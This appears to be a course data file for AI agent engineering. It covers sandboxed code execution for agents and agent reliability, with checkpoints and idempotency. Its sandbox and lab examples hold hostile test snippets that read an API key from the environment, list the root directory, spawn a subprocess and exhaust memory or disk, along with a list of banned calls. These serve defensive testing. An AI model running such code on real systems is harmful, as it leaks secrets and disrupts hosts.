    'No secrets: an empty environment, no mounted credentials, no access to the host or metadata endpoints.',
    'Network: deny by default; allow-list specific hosts if the task needs them.',
    'Files in and out explicitly: upload inputs, download outputs; destroy the sandbox afterwards or reuse it only within one user’s session.',
    'Return structured results (stdout, stderr, files, exit status, truncation flags) so the model can react to errors.'
  ],
  concept: { title: 'A clean room you can throw away', body: `<p>Treat each execution like a lab experiment with a hazardous sample: done in a sealed room with only the equipment needed, nothing valuable inside, a timer on the door, and the room incinerated afterwards. Resource limits are the timer; the microVM is the sealed room; deny-by-default networking keeps the sample from walking out.</p>` },
  walk: [
    { h: 'Hosted sandboxes', body: '<p>Typical usage with two common services; check their current docs for exact parameters. Shown, not run here.</p>', code: String.raw`# E2B: code interpreter in a microVM
from e2b_code_interpreter import Sandbox
with Sandbox.create(timeout=120) as sbx:
    sbx.files.write("/home/user/sales.csv", csv_bytes)
    execution = sbx.run_code(model_code)
    print(execution.logs.stdout, execution.error)

# Modal: a sandbox from an image, with explicit resources
import modal
app = modal.App.lookup("agent-sandboxes", create_if_missing=True)
sb = modal.Sandbox.create(app=app, image=modal.Image.debian_slim().pip_install("pandas"), timeout=120)
proc = sb.exec("python", "-c", model_code)
print(proc.stdout.read()); sb.terminate()` },
    { h: 'Expose it as one tool', body: '<p>The agent sees <code class="i">run_python(code)</code> returning stdout, stderr, exit status and produced files. Inputs are uploaded by your code, not fetched by the model from the internet.</p>' },
    { h: 'Defence in depth', body: '<p>Even inside a sandbox: scan outputs before showing them, cap retries, log every execution with the code that ran, and require approval before any sandbox gets network access or long runtimes.</p>' }
  ],
  analogy: `<p><b>A bomb-disposal robot.</b> You would not open a suspicious package at your desk. You send it to a reinforced room, handle it remotely with limited tools, and if something goes wrong, the damage stays inside that room.</p>`,
  diagram: {
    title: 'A code-execution tool for agents',
    cols: [['agent'], ['tool'], ['box'], ['lim', 'net'], ['res']],
    groups: [{ cols: [2, 3], label: 'SANDBOX (microVM / gVisor)' }],
    nodes: [
      { id: 'agent', label: 'Agent', sub: 'writes code', tone: 'fde', info: 'Model-generated code: untrusted by definition.' },
      { id: 'tool', label: 'run_python tool', sub: 'upload inputs', tone: 'acc', info: 'Your tool: creates the sandbox, uploads files, enforces policy.' },
      { id: 'box', label: 'Interpreter', sub: 'no secrets', tone: 'be', info: 'Fresh environment with only the task’s files.' },
      { id: 'lim', label: 'Limits', sub: 'cpu · mem · disk · time', tone: 'warn', info: 'Hard caps so runaway code dies.' },
      { id: 'net', label: 'Egress policy', sub: 'deny by default', tone: 'bad', info: 'No network unless an allow-list says so.' },
      { id: 'res', label: 'Result', sub: 'stdout · files · exit', tone: 'ok', info: 'Structured, truncated output back to the agent.' }
    ],
    edges: [{ a: 'agent', b: 'tool', step: 1 }, { a: 'tool', b: 'box', step: 2 }, { a: 'box', b: 'lim', dash: true }, { a: 'box', b: 'net', dash: true }, { a: 'box', b: 'res', step: 3, bend: 60 }, { a: 'res', b: 'agent', dash: true, bend: 80, step: 4 }],
    steps: ['The agent proposes code.', 'Your tool runs it in a fresh sandbox with the needed files.', 'Output, files and exit status are collected.', 'A structured result goes back to the agent.'],
    caption: 'Untrusted code runs only where secrets, network and resources are out of reach.'
  },
  illustrated: { title: 'What each layer stops', body: `<div class="tbl"><table><thead><tr><th>threat</th><th>subprocess + rlimits</th><th>container</th><th>gVisor / microVM</th></tr></thead><tbody>
    <tr><td>infinite loop, memory bomb</td><td>yes</td><td>yes</td><td>yes</td></tr>
    <tr><td>reading host files and secrets</td><td>partly (empty env, temp dir)</td><td>yes, if nothing mounted</td><td>yes</td></tr>
    <tr><td>network exfiltration</td><td>no</td><td>with network policy</td><td>with egress policy</td></tr>
    <tr><td>kernel exploit to escape</td><td>no</td><td>weak (shared kernel)</td><td>strong (separate kernel or syscall layer)</td></tr></tbody></table></div>` },
  code: {
    title: 'A local execution tool with OS limits, and what it cannot stop', file: 'sandbox_local.py',
    intro: '<p>A subprocess runner with CPU, memory, file size and process limits, an empty environment, a temporary working directory, a wall-clock timeout and output truncation. It stops runaway code, but it does not isolate the network or the kernel, which is why production uses microVM or gVisor sandboxes. Linux and macOS only (uses the <code class="i">resource</code> module).</p>',
    src: String.raw`import os, resource, signal, subprocess, sys, tempfile, time

def _limits(cpu_s: int, mem_mb: int, fsize_mb: int):
    def apply():
        resource.setrlimit(resource.RLIMIT_CPU, (cpu_s, cpu_s + 1))
        resource.setrlimit(resource.RLIMIT_AS, (mem_mb << 20, mem_mb << 20))
        resource.setrlimit(resource.RLIMIT_FSIZE, (fsize_mb << 20, fsize_mb << 20))
        resource.setrlimit(resource.RLIMIT_NPROC, (64, 64))
        resource.setrlimit(resource.RLIMIT_CORE, (0, 0))
        os.setsid()                                   # own process group so we can kill everything it starts
    return apply

def run_python(code: str, files: dict[str, bytes] | None = None, cpu_s=2, mem_mb=256, fsize_mb=5, wall_s=4, max_out=240) -> dict:
    with tempfile.TemporaryDirectory() as work:
        for name, data in (files or {}).items():
            with open(os.path.join(work, os.path.basename(name)), "wb") as f:
                f.write(data)
        with open(os.path.join(work, "main.py"), "w") as f:
            f.write(code)
        t0 = time.perf_counter()
        try:
            p = subprocess.run([sys.executable, "-I", "main.py"], cwd=work, capture_output=True, text=True, timeout=wall_s,
                               env={"PATH": "/usr/bin:/bin", "HOME": work}, preexec_fn=_limits(cpu_s, mem_mb, fsize_mb))
            out, rc = (p.stdout + p.stderr).strip(), p.returncode
            status = "ok" if rc == 0 else (f"killed by {signal.Signals(-rc).name}" if rc < 0 else f"exit {rc}")
        except subprocess.TimeoutExpired:
            out, status = "", f"killed: wall-clock limit {wall_s}s"
        produced = sorted(set(os.listdir(work)) - {"main.py"} - set(files or {}))
    truncated = len(out) > max_out
    return {"status": status, "output": out[-max_out:], "truncated": truncated, "files": produced, "seconds": round(time.perf_counter() - t0, 1)}

CSV = b"region,revenue\nEMEA,120\nAPAC,95\nAMER,210\n"
cases = {
    "analysis":    "import csv\nrows = list(csv.DictReader(open('sales.csv')))\nprint(max(rows, key=lambda r: int(r['revenue'])))\nopen('chart.txt','w').write('AMER ####')",
    "cpu loop":    "while True: pass",
    "sleeper":     "import time; time.sleep(30)",
    "memory bomb": "x = bytearray(2 * 1024**3)",
    "disk filler": "open('big.bin', 'wb').write(b'0' * 50 * 1024 * 1024)",
    "secrets":     "import os; print('env:', sorted(os.environ)); print('key:', os.environ.get('ANTHROPIC_API_KEY'))",
    "chatty":      "for i in range(10000): print('row', i)",
}
os.environ["ANTHROPIC_API_KEY"] = "sk-parent-process-secret"      # present in the parent, must not leak
for name, code in cases.items():
    r = run_python(code, files={"sales.csv": CSV})
    last = r["output"].splitlines()[-1] if r["output"] else ""
    print(f"{name:<12} {r['status']:<28} files={r['files']} truncated={r['truncated']} {last[:60]}")
print("\nnot covered here: network egress and kernel isolation -> use a microVM or gVisor sandbox in production")`
  },
  lab: {
    title: 'A data-analysis tool an agent can call safely', file: 'analysis_tool_lab.py',
    scenario: `<p>A customer’s analysts want an agent that answers questions about uploaded CSVs by writing Python. Build the <code class="i">analyze(question, csv_bytes, code)</code> tool around the local runner: validate the code before running it (reject imports outside an allow-list, reject <code class="i">open()</code> on paths other than the input file), run it with limits, cap output, and return a structured result the model can learn from. Test it with good and malicious code.</p>`,
    steps: ['Parse the code with <code class="i">ast</code>; allow imports only from {csv, statistics, math, json, collections}.', 'Reject calls to <code class="i">open</code> unless the first argument is the literal <code class="i">"data.csv"</code> and the mode is read-only.', 'Reject <code class="i">__import__</code>, <code class="i">eval</code>, <code class="i">exec</code> and attribute access to names starting with <code class="i">__</code>.', 'Run accepted code with the limits from the Code tab; return {status, output, rejected_reason}.', 'Test five snippets: a valid analysis, <code class="i">import os</code>, writing a file, <code class="i">__import__("subprocess")</code>, and an infinite loop.'],
    checks: ['The valid analysis returns the right answer.', 'Three malicious snippets are rejected before running, with reasons.', 'The infinite loop is killed by limits.'],
    hints: ['Walk the tree with <code class="i">ast.walk</code> and inspect Import, ImportFrom, Call and Attribute nodes.', 'Static checks are a filter, not a sandbox: always run behind real isolation too.'],
    starter: String.raw`import ast, os, resource, subprocess, sys, tempfile

ALLOWED_IMPORTS = {"csv", "statistics", "math", "json", "collections"}

def check(code: str) -> str | None:
    """Return a rejection reason, or None if the code passes static checks."""
    # TODO
    return None

def analyze(code: str, csv_bytes: bytes) -> dict:
    # TODO: check, then run with limits (copy run_python from the Code tab)
    return {}

CSV = b"plan,seats,mrr\nstarter,3,0\npro,25,1200\nenterprise,400,30000\n"
for code in ["import csv\nrows = list(csv.DictReader(open('data.csv')))\nprint(sum(int(r['mrr']) for r in rows))",
             "import os\nprint(os.listdir('/'))",
             "open('out.txt', 'w').write('x')",
             "__import__('subprocess').run(['id'])",
             "while True: pass"]:
    print(analyze(code, CSV))`,
    solution: String.raw`import ast, os, resource, signal, subprocess, sys, tempfile

ALLOWED_IMPORTS = {"csv", "statistics", "math", "json", "collections"}
BANNED_CALLS = {"eval", "exec", "compile", "__import__", "globals", "locals", "getattr", "setattr", "delattr"}

def check(code: str) -> str | None:
    try:
        tree = ast.parse(code)
    except SyntaxError as e:
        return f"syntax error: {e.msg}"
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            bad = [a.name for a in node.names if a.name.split(".")[0] not in ALLOWED_IMPORTS]
            if bad: return f"import not allowed: {bad}"
        if isinstance(node, ast.ImportFrom) and (node.module or "").split(".")[0] not in ALLOWED_IMPORTS:
            return f"import not allowed: {node.module}"
        if isinstance(node, ast.Attribute) and node.attr.startswith("__"):
            return f"dunder attribute access: {node.attr}"
        if isinstance(node, ast.Call) and isinstance(node.func, ast.Name):
            if node.func.id in BANNED_CALLS:
                return f"call not allowed: {node.func.id}"
            if node.func.id == "open":
                path = node.args[0].value if node.args and isinstance(node.args[0], ast.Constant) else None
                mode = node.args[1].value if len(node.args) > 1 and isinstance(node.args[1], ast.Constant) else "r"
                if path != "data.csv" or any(ch in str(mode) for ch in "wax+"):
                    return f"open() only allowed as open('data.csv') read-only, got {path!r} mode {mode!r}"
    return None

def _limits():
    resource.setrlimit(resource.RLIMIT_CPU, (2, 3)); resource.setrlimit(resource.RLIMIT_AS, (256 << 20, 256 << 20))
    resource.setrlimit(resource.RLIMIT_FSIZE, (1 << 20, 1 << 20)); resource.setrlimit(resource.RLIMIT_NPROC, (32, 32)); os.setsid()

def analyze(code: str, csv_bytes: bytes, max_out=200) -> dict:
    reason = check(code)
    if reason:
        return {"status": "rejected", "reason": reason}
    with tempfile.TemporaryDirectory() as work:
        open(os.path.join(work, "data.csv"), "wb").write(csv_bytes)
        open(os.path.join(work, "main.py"), "w").write(code)
        try:
            p = subprocess.run([sys.executable, "-I", "main.py"], cwd=work, capture_output=True, text=True, timeout=4,
                               env={"PATH": "/usr/bin:/bin"}, preexec_fn=_limits)
            status = "ok" if p.returncode == 0 else (f"killed by {signal.Signals(-p.returncode).name}" if p.returncode < 0 else f"exit {p.returncode}")
            return {"status": status, "output": (p.stdout + p.stderr).strip()[-max_out:]}
        except subprocess.TimeoutExpired:
            return {"status": "killed: wall-clock limit"}

CSV = b"plan,seats,mrr\nstarter,3,0\npro,25,1200\nenterprise,400,30000\n"
for code in ["import csv\nrows = list(csv.DictReader(open('data.csv')))\nprint(sum(int(r['mrr']) for r in rows))",
             "import os\nprint(os.listdir('/'))",
             "open('out.txt', 'w').write('x')",
             "__import__('subprocess').run(['id'])",
             "while True: pass"]:
    print(f"{code.splitlines()[0][:40]:<42} -> {analyze(code, CSV)}")`
  },
  design: {
    lead: '<p>Code execution is a platform service: per-request sandboxes, pools for latency, quotas for cost, and policies for what code may touch. Design it as a security boundary first and a feature second.</p>',
    scale: [{ h: 'Warm pools', p: 'Cold-starting a sandbox per call adds latency; keep warm pools per image, and reuse a sandbox only within one user’s session.' }, { h: 'Quotas', p: 'CPU-seconds, memory and sandbox-minutes per tenant, with alerts on abuse patterns such as crypto mining.' }],
    fail: [{ h: 'Secrets in the image', p: 'API keys baked into the sandbox image or environment are one print() away from the model. Keep sandboxes credential-free.' }, { h: 'Open network', p: 'Unrestricted egress turns injection into exfiltration. Deny by default and allow-list per task.' }],
    trade: [{ h: 'Hosted vs self-hosted sandboxes', p: 'Hosted services are fast to adopt and well isolated; self-hosting (Firecracker, gVisor on Kubernetes) keeps data in your cloud at significant operational cost.' }, { h: 'Persistent vs ephemeral', p: 'Persistent sandboxes let agents build up state (installed packages, files) across steps; ephemeral ones are safer and simpler.' }],
    prompt: '<p>Design a code-interpreter feature for an enterprise analytics assistant with 2,000 daily users and data that must stay in the customer’s AWS account.</p>',
    answer: '<ul><li>Self-hosted microVM sandboxes (Firecracker-based) in the customer’s VPC, or a vendor with in-VPC deployment.</li><li>One sandbox per session, warm pool, 10-minute idle timeout, no credentials, egress denied except an internal package mirror.</li><li>Files staged in by the tool from approved data sources; outputs scanned and size-capped.</li><li>Quotas per user and tenant; audit log of code and outputs; alerts on anomalous resource use.</li></ul>'
  },
  quiz: [
    { q: 'Which isolation is appropriate for untrusted model-written code in production?', o: ['A subprocess on the API server', 'A microVM or gVisor-based sandbox with limits and no secrets', 'A thread with a timeout', 'eval() with a try/except'], a: 1, why: 'Strong isolation, resource limits and no credentials.' },
    { q: 'What does RLIMIT_AS limit?', o: ['Network bandwidth', 'The process’s virtual memory', 'Number of files', 'CPU cores'], a: 1, why: 'Address space: allocations beyond it fail with MemoryError.' },
    { q: 'Why is an AST allow-list not a sandbox?', o: ['It is slow', 'Static checks can be bypassed; they are a filter in front of real isolation', 'It breaks valid code', 'Python has no AST'], a: 1, why: 'Defence in depth, not a security boundary.' }
  ],
  interview: [
    { q: 'How would you let an agent execute code safely?', a: '<p>In a disposable sandbox with strong isolation (microVM or gVisor), no credentials, deny-by-default egress, CPU, memory, disk and time limits, explicit file upload and download, output truncation, per-tenant quotas and full audit logs. The agent sees one tool returning structured results; risky capabilities such as network access require approval.</p>' },
    { q: 'What can go wrong with a code-execution tool even inside a sandbox?', a: '<p>Prompt-injected code can still misuse whatever the sandbox can reach: allowed network hosts, uploaded data, or outputs shown to users. Resource abuse such as mining, data exfiltration through allowed channels, and misleading outputs remain risks, so I limit what goes in, what can go out, and I monitor usage.</p>' }
  ]
});

/* ===================================================================== 5.9 */
L({
  id: '5.9', title: 'Agent reliability and UX', minutes: 55, roles: ['fde', 'be'], sim: 'compound',
  tags: 'compounding errors · verification · checkpoints · idempotency · human-in-the-loop · progress · cancellation · trust',
  mental: 'Per-step errors multiply across long tasks, so reliability comes from structure: verify each important step, checkpoint progress, make actions idempotent, ask humans at the right moments, and show users what the agent is doing so they can trust and correct it.',
  intro: `<p>A model that gets each step right 95% of the time completes a 20-step task only about a third of the time. That arithmetic, more than model quality, is why agents that impress in demos disappoint in production. Reliability engineering for agents borrows from distributed systems (retries, checkpoints, idempotency) and from product design (progress, confirmation, undo).</p>
  <p>This lesson closes Phase 5 by combining both: the techniques that move an agent from “works sometimes” to “works, and fails safely”.</p>`,
  points: [
    '<b>Verify</b> steps with cheap, objective checks where possible: schemas, tests, totals that must match, re-reading what was written.',
    '<b>Retry with feedback</b>: send the verifier’s error back and let the agent correct; cap attempts.',
    '<b>Checkpoint</b> after each completed step so a crash or timeout resumes instead of restarting.',
    '<b>Idempotent actions</b>: side effects carry keys so resumed or retried steps never double-act.',
    '<b>Escalate</b> on low confidence, policy boundaries or irreversible actions; silent failure is worse than asking.',
    '<b>UX</b>: show the plan and live progress, allow cancel and correction mid-run, confirm risky actions, and show sources and what changed.'
  ],
  concept: { title: 'Fail loudly, early and safely', body: `<p>The most expensive agent failure is the silent one: a confident, wrong result that someone acts on. Design so that errors are caught close to where they happen (verification), cost little to recover from (checkpoints, idempotency), and surface to a human when the system is unsure (escalation). Measure silent failures separately from escalations; a rising escalation rate is fine, a rising silent-failure rate is an incident.</p>` },
  walk: [
    { h: 'Know your step reliability', body: '<p>From transcripts and evals (Phase 7.5), estimate per-step success for each step type. The simulator shows how quickly that compounds and how much verification recovers.</p>' },
    { h: 'Verify with the cheapest strong check', body: `<div class="tbl"><table><thead><tr><th>step</th><th>verifier</th></tr></thead><tbody>
      <tr><td>extract invoice fields</td><td>schema plus line items summing to the total</td></tr>
      <tr><td>write code</td><td>tests, type checker, linter</td></tr>
      <tr><td>SQL query</td><td>dry run, row-count sanity, compare with a known aggregate</td></tr>
      <tr><td>update a record</td><td>read it back and compare</td></tr>
      <tr><td>free-text answer</td><td>citation check (lesson 4.7) or an LLM judge (Phase 7.3)</td></tr></tbody></table></div>` },
    { h: 'Design the human moments', body: '<p>Ask before irreversible or high-value actions, when confidence is low, and when the agent hits a policy boundary. Make the request specific (“Refund $90 to ch_2? Reason: duplicate within 9 s”), not “Should I continue?”.</p>' }
  ],
  analogy: `<p><b>A pilot’s checklist and an autopilot.</b> The autopilot flies most of the way, but each phase has checklists (verification), the flight is logged continuously (checkpoints), critical changes need confirmation from both pilots (human-in-the-loop), and the instruments always show what the autopilot is doing (progress UX).</p>`,
  diagram: {
    title: 'A reliable agent step',
    cols: [['plan'], ['act'], ['verify'], ['ckpt', 'retry', 'esc'], ['ui']],
    nodes: [
      { id: 'plan', label: 'Plan shown', sub: 'user can edit', tone: 'fde', info: 'The user sees and can adjust the plan before work starts.' },
      { id: 'act', label: 'Act', sub: 'idempotency key', tone: 'acc', info: 'Each side effect carries a key derived from run and step.' },
      { id: 'verify', label: 'Verify', sub: 'tests · schema · read-back', tone: 'be', info: 'Cheap objective checks after each important step.' },
      { id: 'ckpt', label: 'Checkpoint', sub: 'step done', tone: 'ok', info: 'Progress saved; a crash resumes here.' },
      { id: 'retry', label: 'Retry with feedback', sub: '≤ 2 attempts', tone: 'warn', info: 'Verifier errors go back to the agent.' },
      { id: 'esc', label: 'Escalate', sub: 'specific question', tone: 'bad', info: 'Low confidence, policy limits or irreversible actions.' },
      { id: 'ui', label: 'Live progress', sub: 'cancel · sources · diff', info: 'Users see what happened and can stop or correct it.' }
    ],
    edges: [{ a: 'plan', b: 'act', step: 1 }, { a: 'act', b: 'verify', step: 2 }, { a: 'verify', b: 'ckpt', label: 'pass', step: 3 }, { a: 'verify', b: 'retry', step: 3 }, { a: 'verify', b: 'esc', dash: true, step: 3 }, { a: 'retry', b: 'act', dash: true, bend: 70 }, { a: 'ckpt', b: 'ui', step: 4 }, { a: 'esc', b: 'ui', step: 4 }],
    steps: ['The plan is visible and editable.', 'The step acts with an idempotency key.', 'A verifier checks the result: pass, retry or escalate.', 'Progress and questions reach the user live.'],
    caption: 'Verify every important step; checkpoint, retry or escalate; keep the user in view.'
  },
  illustrated: { title: 'Silent failures vs escalations', body: `<p>Per 1,000 runs of a 12-step task with 96% per-step success, from the Code tab\u2019s simulation:</p>
    <div class="tbl"><table><thead><tr><th>design</th><th>correct</th><th>escalated</th><th>silently wrong</th></tr></thead><tbody>
    <tr><td>no verification</td><td class="n">610</td><td class="n">0</td><td class="n">390</td></tr>
    <tr><td>verifier catches 80%, 1 retry, then escalate</td><td class="n">892</td><td class="n">12</td><td class="n">96</td></tr>
    <tr><td>verifier catches 95%, 2 retries, then escalate</td><td class="n">973</td><td class="n">1</td><td class="n">26</td></tr>
    <tr><td>better model (99% per step), no verification</td><td class="n">885</td><td class="n">0</td><td class="n">115</td></tr></tbody></table></div>
    <p>A strong verifier on a weaker model beats a stronger model without one, and turns most remaining failures into visible ones.</p>` },
  code: {
    title: 'Simulate reliability strategies before building them', file: 'reliability_sim.py', browser: true,
    intro: '<p>A Monte Carlo model of a 12-step agent task. Each step is right with probability p; a verifier catches a wrong step with probability v; a caught step is retried; a step that fails again is escalated to a human. We count correct, escalated and silently wrong outcomes, and the steps spent. Use this to decide where verification is worth building.</p>',
    src: String.raw`import random

def run_task(rng, steps, p, verifier, retries, escalate):
    spent = 0
    for _ in range(steps):
        spent += 1
        ok = rng.random() < p
        attempts = 0
        while not ok and rng.random() < verifier:          # wrong, and the verifier noticed
            if attempts == retries:
                return ("escalated", spent) if escalate else ("failed_loudly", spent)
            attempts += 1; spent += 1
            ok = rng.random() < p
        if not ok:
            return ("silently_wrong", spent)               # wrong and nobody noticed: the dangerous case
    return ("correct", spent)

def simulate(name, runs=20_000, steps=12, p=0.96, verifier=0.0, retries=0, escalate=False):
    rng, counts, spent = random.Random(42), {}, 0
    for _ in range(runs):
        outcome, s = run_task(rng, steps, p, verifier, retries, escalate)
        counts[outcome] = counts.get(outcome, 0) + 1; spent += s
    pct = lambda k: f"{100 * counts.get(k, 0) / runs:5.1f}%"
    print(f"{name:<34} correct {pct('correct')}  escalated {pct('escalated')}  loud fail {pct('failed_loudly')}  "
          f"silently wrong {pct('silently_wrong')}  steps/run {spent / runs:5.2f}")

simulate("no verification")
simulate("verifier 80%, 1 retry", verifier=0.8, retries=1)
simulate("verifier 80%, 1 retry, escalate", verifier=0.8, retries=1, escalate=True)
simulate("verifier 95%, 2 retries, escalate", verifier=0.95, retries=2, escalate=True)
simulate("better model p=0.99, no verification", p=0.99)`
  },
  lab: {
    title: 'A resumable, idempotent step runner', file: 'resumable_lab.py', browser: true,
    scenario: `<p>An onboarding agent provisions a new enterprise customer in six steps: create workspace, configure SSO, import users, create billing account, send invoice, notify the account team. The worker crashes during step 4. Build a runner that checkpoints each completed step in SQLite, resumes after the crash, and never repeats a side effect, even if a step runs twice.</p>`,
    steps: ['Table <code class="i">steps(run_id, step, status, result)</code> and table <code class="i">effects(idempotency_key PRIMARY KEY, result)</code>.', 'Each side effect goes through <code class="i">effect(key, fn)</code>: if the key exists, return the stored result; otherwise run, store, return.', 'Keys are <code class="i">f"{run_id}:{step}"</code>.', 'The runner skips steps already marked done and resumes from the first one that is not.', 'Simulate a crash after the billing account is created but before the step is marked done; rerun and show the billing effect is not repeated.'],
    checks: ['The second run completes all six steps.', 'Every external effect happened exactly once.', 'The runner reports which steps it skipped on resume.'],
    hints: ['A crash between "effect done" and "step marked done" is exactly the case idempotency keys are for.', 'Use a module-level counter per effect name to prove exactly-once.'],
    starter: String.raw`import sqlite3
db = sqlite3.connect(":memory:")
db.executescript("CREATE TABLE steps (run_id TEXT, step TEXT, status TEXT, result TEXT, PRIMARY KEY (run_id, step));"
                 "CREATE TABLE effects (idempotency_key TEXT PRIMARY KEY, result TEXT);")
CALLS = {}
def external(name):
    CALLS[name] = CALLS.get(name, 0) + 1
    return f"{name}-ok"

STEPS = ["create_workspace", "configure_sso", "import_users", "create_billing_account", "send_invoice", "notify_team"]

def effect(key, fn):
    # TODO
    return fn()

def run(run_id, crash_after_effect=None):
    # TODO
    pass

run("onb-1", crash_after_effect="create_billing_account")
run("onb-1")
print(CALLS)`,
    solution: String.raw`import sqlite3
db = sqlite3.connect(":memory:")
db.executescript("CREATE TABLE steps (run_id TEXT, step TEXT, status TEXT, result TEXT, PRIMARY KEY (run_id, step));"
                 "CREATE TABLE effects (idempotency_key TEXT PRIMARY KEY, result TEXT);")
CALLS = {}
def external(name):
    CALLS[name] = CALLS.get(name, 0) + 1
    return f"{name}-ok"

STEPS = ["create_workspace", "configure_sso", "import_users", "create_billing_account", "send_invoice", "notify_team"]

class Crash(Exception):
    pass

def effect(key, fn):
    row = db.execute("SELECT result FROM effects WHERE idempotency_key = ?", (key,)).fetchone()
    if row:
        return row[0]                                       # already happened: replay the stored result
    result = fn()
    db.execute("INSERT INTO effects VALUES (?, ?)", (key, result)); db.commit()
    return result

def run(run_id, crash_after_effect=None):
    done = {s for (s,) in db.execute("SELECT step FROM steps WHERE run_id = ? AND status = 'done'", (run_id,))}
    skipped = [s for s in STEPS if s in done]
    try:
        for step in STEPS:
            if step in done:
                continue
            result = effect(f"{run_id}:{step}", lambda: external(step))
            if step == crash_after_effect:
                raise Crash(f"worker died after {step} effect, before checkpoint")
            db.execute("INSERT OR REPLACE INTO steps VALUES (?, ?, 'done', ?)", (run_id, step, result)); db.commit()
        print(f"run {run_id}: completed (skipped on resume: {skipped})")
    except Crash as e:
        print(f"run {run_id}: CRASH: {e}")

run("onb-1", crash_after_effect="create_billing_account")
run("onb-1")
print("external calls:", CALLS)
assert all(v == 1 for v in CALLS.values()) and len(CALLS) == len(STEPS)
print("every side effect happened exactly once")`
  },
  design: {
    lead: '<p>Agent reliability is measured, designed and operated like any SLO: define success and silent-failure rates, build verification where the math says it pays, and give users the controls to catch what the system misses.</p>',
    scale: [{ h: 'Reliability budgets per workflow', p: 'Track per-step success and end-to-end success per workflow type; invest in verifiers for the steps with the worst numbers.' }, { h: 'Human capacity', p: 'Escalations need staffed queues with SLAs. Size escalation thresholds to the team that answers them.' }],
    fail: [{ h: 'Over-trusting confidence', p: 'Model self-reported confidence is poorly calibrated. Prefer objective checks; calibrate any confidence score on labelled data.' }, { h: 'Approval fatigue', p: 'Asking for confirmation on everything trains users to click yes. Reserve confirmations for meaningful, specific decisions.' }],
    trade: [{ h: 'Verification cost vs value', p: 'Verifiers add latency and tokens; spend them on high-impact steps, not everywhere.' }, { h: 'Autonomy vs oversight', p: 'More autonomy means fewer interruptions and more risk. Expand autonomy as measured reliability earns it.' }],
    prompt: '<p>A customer’s procurement agent occasionally orders wrong quantities. Design the reliability and UX changes.</p>',
    answer: '<ul><li>Verifier: quantities checked against requisition and historical ranges; totals matched to budget.</li><li>Confirmation with a specific diff for orders above a threshold or outside normal ranges.</li><li>Idempotent order creation keyed by requisition id; checkpoints per step; resume on failure.</li><li>Dashboards: silent-failure rate from audits, escalation rate, time to approval; expand autonomy per category as accuracy improves.</li></ul>'
  },
  quiz: [
    { q: 'Per-step success is 95%. Roughly how often does a 20-step task fully succeed without checks?', o: ['95%', 'About 36%', 'About 80%', 'About 5%'], a: 1, why: '0.95^20 ≈ 0.36.' },
    { q: 'Which outcome should a reliability dashboard treat as most serious?', o: ['Escalations to a human', 'Silent wrong results', 'Retries', 'Long runs'], a: 1, why: 'Undetected errors cause real damage; escalations are the system working.' },
    { q: 'A worker crashes after charging a card but before saving progress. What prevents a double charge on resume?', o: ['A bigger model', 'An idempotency key on the charge', 'Lower temperature', 'More logging'], a: 1, why: 'The retried charge with the same key returns the original result.' }
  ],
  interview: [
    { q: 'How do you make a long-running agent reliable?', a: '<p>Measure per-step reliability, then add structure where it compounds badly: objective verifiers after important steps with bounded retries and feedback, checkpoints so crashes resume, idempotency keys on every side effect, budgets, and escalation with specific questions on low confidence or irreversible actions. Track silent-failure rate separately from escalations.</p>' },
    { q: 'What makes agent UX trustworthy?', a: '<p>Visibility and control: show the plan and live progress, cite sources, show diffs of what changed, ask for confirmation only on meaningful decisions with specific details, allow cancel and correction mid-run, and make results easy to verify or undo.</p>' }
  ]
});
})();
